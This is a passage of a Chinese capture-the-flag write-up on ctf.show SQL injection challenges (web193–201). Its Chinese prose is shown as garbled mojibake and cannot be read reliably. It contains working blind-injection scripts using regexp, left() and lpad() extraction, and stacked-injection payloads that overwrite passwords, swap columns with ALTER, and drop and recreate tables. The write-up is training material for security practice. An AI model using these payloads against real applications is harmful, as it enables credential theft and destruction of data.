string">"https://d8ecee4e-9c33-46b3-af79-befbc602b859.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsflag <span class="token operator">=</span> <span class="token string">'ctf'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j        <span class="token comment"># æŸ¥æ•°æ®åº“  ctfshow_flxg,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥å­—æ®µ  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_flxg"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"&#125;"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>äºŒåˆ†æ³•ä¾ç„¶å¯è¡Œï¼Œåªæ˜¯å¹¶ä¸æ˜¯å•ç‹¬çš„å­—ç¬¦æ¯”è¾ƒï¼Œæ˜¯å­—ç¬¦ä¸²çš„æ¯”è¾ƒï¼Œä½†åŸç†æ˜¯ä¸€æ ·çš„ã€‚<br>å³ï¼šab&#x3D;abï¼Œab&lt;acï¼Œæ˜¯å¯¹å­—ç¬¦ä¸²ä¸ä¸€è‡´çš„ç¬¬ä¸€å­—ç¬¦è¿›è¡Œæ¯”è¾ƒã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://fa58a58a-11d4-4c3e-9009-e7a0c53565b8.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)&lt;'&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token builtin">max</span> <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">min</span> <span class="token operator">=</span> mid </code></pre><h4 id="web194-lpad"><a href="#web194-lpad" class="headerlink" title="web194(lpad)"></a>web194(lpad)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex|substr|char|left|right|substring/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>left</code> <code>right</code>è¢«banäº†ï¼Œå¯ä»¥ç›´æ¥æ­£åˆ™åŒ¹é…ï¼Œä¸è¿‡ç›´æ¥æ­£åˆ™çš„æ–¹æ³•æœ‰å±€é™</p><p>æ‰¾ä¸€æ‰¾å…¶ä»–å’Œæˆªå–æœ‰å…³çš„å‡½æ•°ï¼Œå‘ç°<code>lpad()</code>ã€‚</p><p><code>lpad(str,len,padstr)</code><br><code>lpad()</code>å‡½æ•°è¿”å›å­—ç¬¦ä¸²<code>str</code>ï¼Œ<code>len</code>å°äºå­—ç¬¦ä¸²é•¿åº¦ç›¸å½“äºå­—ç¬¦ä¸²æˆªå–ï¼›å¤§äºå­—ç¬¦ä¸²é•¿åº¦ï¼Œåˆ™åœ¨å·¦å¡«å……ç”¨å­—ç¬¦ä¸²<code>padstr</code>ç›´åˆ°è¾¾åˆ°<code>len</code>å­—ç¬¦é•¿åº¦ã€‚</p><p>æœ‰å·¦å¡«å……ï¼Œä¸€èˆ¬å°±æ˜¯å³å¡«å……ï¼Œæ‰¾åˆ°<code>rpad()</code>ï¼Œç”¨æ³•å’Œ<code>lpad()</code>ç±»ä¼¼ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://8be98a09-12b0-4f66-807f-899826d58216.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">",_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789"</span>tempstr <span class="token operator">=</span> <span class="token string">""</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        <span class="token comment">#payload = "admin'and ((lpad((select database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#ctfshow_flxg</span>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,'')='&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>tempstr<span class="token operator">+</span>mid<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            tempstr <span class="token operator">+=</span> mid            flag <span class="token operator">+=</span> mid            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++++"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web195-å †å æ³¨å…¥"><a href="#web195-å †å æ³¨å…¥" class="headerlink" title="web195(å †å æ³¨å…¥)"></a>web195(å †å æ³¨å…¥)</h4><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¯†ç æ£€æµ‹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'å¯†ç åªèƒ½ä¸ºæ•°å­—'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¯†ç åˆ¤æ–­</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"ç™»é™†æˆåŠŸ flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>è¿‡æ»¤äº†selectï¼Œå•åŒå¼•å·ä¹Ÿè¢«è¿‡æ»¤ï¼Œæ²¡æœ‰æŠ¥é”™æç¤ºã€‚</p><p>æ²¡æœ‰è¿‡æ»¤åˆ†å·ï¼Œè€ƒè™‘å †å æ³¨å…¥ã€‚ä½†ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¯ä»¥é€šè¿‡åå¼•å·åŒ…è£¹è¡¨åç­‰ä¿¡æ¯çš„æ–¹å¼ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">update</span><span class="token identifier"><span class="token punctuation">`</span>ctfshow_user<span class="token punctuation">`</span></span><span class="token keyword">set</span><span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span></code></pre><p>è¿™é‡Œç”¨updateå°†passæ”¹ä¸º1ï¼Œå¯ä»¥ç™»é™†æˆåŠŸ</p><p>å› ä¸ºæŸ¥è¯¢è¯­å¥çš„whereåˆ¤æ–­æ˜¯<code>username=&#123;$username&#125;</code>ï¼Œå¹¶æ²¡æœ‰å¼•å·åŒ…è£¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¾“å…¥æ•°å­—äº†ã€‚</p><p>sqlé‡Œï¼Œæ•°å­—å’Œå­—ç¬¦ä¸²çš„åŒ¹é…æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œå­—ç¬¦ä¸²ä¼šè½¬æ¢ä¸ºæ•°å­—ï¼Œå¦‚<code>0==admin</code>ï¼Œé‚£ä¹ˆå¦‚æœè¾“å…¥çš„usernameæ˜¯0ï¼Œåˆ™ä¼šåŒ¹é…æ‰€æœ‰å¼€å¤´ä¸</p><p>æ˜¯æ•°å­—æˆ–è€…ä¸º0çš„å­—ç¬¦ä¸²å’Œæ•°å­—0</p><p>ä½†æ˜¯å¯ä»¥ä½¿ç”¨å¦ä¸€ç§æ–¹æ³•</p><pre class="language-sql" data-language="sql"><code class="language-sql">payload<span class="token operator">=</span><span class="token string">"0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"</span><span class="token comment"># è‡³äºä¸ºä»€ä¹ˆéå¾—ç”¨åå…­è¿›åˆ¶ç™»å½•ï¼Œæ˜¯å› ä¸ºä¸‹é¢è¿™ä¸ªæ²¡æœ‰å­—ç¬¦ä¸²å•å¼•å·åŒ…å›´</span><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = &#123;$username&#125;;"</span><span class="token punctuation">;</span></code></pre><h4 id="web196-select-row-0"><a href="#web196-select-row-0" class="headerlink" title="web196(select row[0])"></a>web196(select row[0])</h4><p>è¿™é“é¢˜ç›®çš„selectè™½ç„¶å†™çš„æ˜¯è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å®é™…å¹¶æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ï¼ˆæ ¹æ®ç¾¤é‡Œçš„åé¦ˆï¼Œè¯´ç¾¤ä¸»æœ¬æ¥æ˜¯æ‰“ç®—æŠŠè¿‡æ»¤selectå†™æˆse1ectï¼Œä½†æ˜¯</p><p>å¿˜è®°æ”¹äº†ã€‚ä¸è¿‡se1ectä¹Ÿå¹¶æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ„Ÿè§‰çº¯ç²¹å°±æ˜¯æ²¡æœ‰åŠ selectçš„è¿‡æ»¤ï½ï¼‰</p><p>å¯ä»¥ç”¨selectç»•è¿‡passwordçš„ifåˆ¤æ–­ã€‚</p><p>åˆ¤æ–­æ¡ä»¶æ»¡è¶³çš„è®¾å®šæ˜¯<code>$row[0]==$password</code>ï¼Œ$rowå­˜å‚¨çš„æ˜¯ç»“æœé›†ä¸­çš„ä¸€è¡Œæ•°æ®ï¼Œ$row[0]å°±æ˜¯è¿™ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªæ•°æ®ã€‚æ—¢ç„¶å¯ä»¥å †å æ³¨</p><p>å…¥ï¼Œå°±æ˜¯å¯ä»¥å¤šè¯­å¥æŸ¥è¯¢ï¼Œ$rowåº”è¯¥ä¹Ÿä¼šé€ä¸€å¾ªç¯è·å–æ¯ä¸ªç»“æœé›†ã€‚</p><p>é‚£ä¹ˆå¯ä»¥è¾“å…¥usernameä¸º<code>1;select(9)</code>ï¼Œpasswordä¸º9ã€‚å½“$rowè·å–åˆ°ç¬¬äºŒä¸ªæŸ¥è¯¢è¯­å¥select(9)çš„ç»“æœé›†æ—¶ï¼Œå³å¯è·å¾—$row[0]&#x3D;9ï¼Œé‚£</p><p>ä¹ˆpasswordè¾“å…¥9å°±å¯ä»¥æ»¡è¶³æ¡ä»¶åˆ¤æ–­ã€‚åŒæ ·è¾“å…¥å…¶ä»–å¯†ç ä¹Ÿå¯ä»¥</p><h4 id="web197-alertä¿®æ”¹å­—æ®µ-show-tables-drop"><a href="#web197-alertä¿®æ”¹å­—æ®µ-show-tables-drop" class="headerlink" title="web197(alertä¿®æ”¹å­—æ®µ  show tables  drop)"></a>web197(alertä¿®æ”¹å­—æ®µ  show tables  drop)</h4><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"ç™»é™†æˆåŠŸ flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>è¿™æ¬¡selectè¢«banäº†</p><p><strong>æ–¹æ³•ä¸€</strong></p><p>åˆ©ç”¨<code>show</code>ã€‚æ ¹æ®é¢˜ç›®ç»™çš„æŸ¥è¯¢è¯­å¥ï¼Œå¯ä»¥çŸ¥é“æ•°æ®åº“çš„è¡¨åä¸ºctfshow_userï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡<code>show tables</code>ï¼Œè·å–è¡¨åçš„ç»“æœé›†ï¼Œåœ¨è¿™ä¸ª</p><p>ç»“æœé›†é‡Œå®šç„¶æœ‰ä¸€è¡Œçš„æ•°æ®ä¸ºctfshow_userã€‚</p><p>ç”¨æˆ·åï¼š<code>1;show tables</code></p><p>å¯†ç ï¼š<code>ctfshow_user</code></p><p><strong>æ–¹æ³•äºŒ</strong></p><p>å¯ä»¥åˆ©ç”¨<code>alter</code>ä¿®æ”¹å­—æ®µåï¼ŒæŠŠ<code>id</code>å’Œ<code>pass</code>å¯¹è°ƒï¼Œç„¶åçˆ†ç ´idã€‚</p><p><strong>ALTER TABLE</strong> è¯­å¥ç”¨äºåœ¨å·²æœ‰çš„è¡¨ä¸­æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤åˆ—ã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change column &#96;pass&#96; &#96;a&#96; varchar(255);alter table ctfshow_user change column &#96;id&#96; &#96;pass&#96; varchar(255);alter table ctfshow_user change column &#96;a&#96; &#96;id&#96; varchar(255)</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://1a4c8604-7c24-4000-a07a-b9c23f8c0ca3.challenge.ctf.show/api/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>  <span class="token comment"># 0</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ç™»é™†æˆåŠŸ"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+]id </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> is right"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><strong>æ–¹æ³•ä¸‰</strong></p><p>æ›´æ–°è¡¨ã€‚è¿‡æ»¤äº†updateï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ è¡¨ï¼Œé‡æ–°å»ºä¸€ä¸ªåŒæ ·è¡¨åçš„è¡¨ï¼Œåˆ—åç»™çš„æŸ¥è¯¢è¯­å¥ä¹Ÿå·²ç»å‘ŠçŸ¥ï¼Œåˆ†åˆ«æ˜¯usernameå’Œpassã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;drop table ctfshow_user;create table ctfshow_user(&#96;username&#96; varchar(100),&#96;pass&#96; varchar(100));insert ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(1,1)</code></pre><p>è¿™é‡Œçš„æ„æ€å°±æ˜¯åˆ é™¤ä»¥å‰çš„è¡¨ï¼Œå†è‡ªå·±æ–°å»ºä¸€ä¸ªå¹¶ä¸”æ’å…¥æ•°æ®ï¼šusername&#x3D;1ï¼Œpass&#x3D;1</p><p>ç„¶åç›´æ¥è¾“å…¥1ä¸ºç”¨æˆ·åå’Œå¯†ç ï¼Œç™»å½•å³å¯å¾—åˆ°flagã€‚</p><h4 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h4><p>è¿‡æ»¤äº†<code>create</code> <code>drop</code>ï¼Œä½†å¯ä»¥ç”¨å…¶ä»–æ–¹æ³•</p><h4 id="wen199"><a href="#wen199" class="headerlink" title="wen199"></a>wen199</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><strong>æ–¹æ³•ä¸€</strong>ï¼šæœ¬é¢˜ä¾ç„¶å¯ä»¥ä½¿ç”¨<code>show tables</code>ã€‚</p><p><strong>æ–¹æ³•äºŒ</strong>ï¼šæœ¬é¢˜è¿‡æ»¤äº†æ‹¬å·ï¼Œé™åˆ¶äº†ä¹‹å‰payloadä¸­çš„varchar(100)ï¼Œå¯ä»¥æ”¹ä¸ºtextã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change &#96;pass&#96; &#96;tmp&#96; text;alter table ctfshow_user change &#96;username&#96; &#96;pass&#96; text;alter table ctfshow_user change &#96;tmp&#96; &#96;username&#96; text;</code></pre><h4 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h4><p>å¢åŠ äº†é€—å·çš„è¿‡æ»¤ï¼Œä¸å½±å“ã€‚web199çš„ä¸¤ä¸ªæ–¹æ³•éƒ½å¯ä»¥ç”¨ã€‚</p><h4 id="web201-Sqlmap-â€“referer"><a href="#web201-Sqlmap-â€“referer" class="headerlink" title="web201(Sqlmap â€“referer)"></a>web201(Sqlmap â€“referer)</h4><p><a href="https://sqlmap.highlight.ink/"><a href="https://sqlmap.highlight.ink/">sqlmap 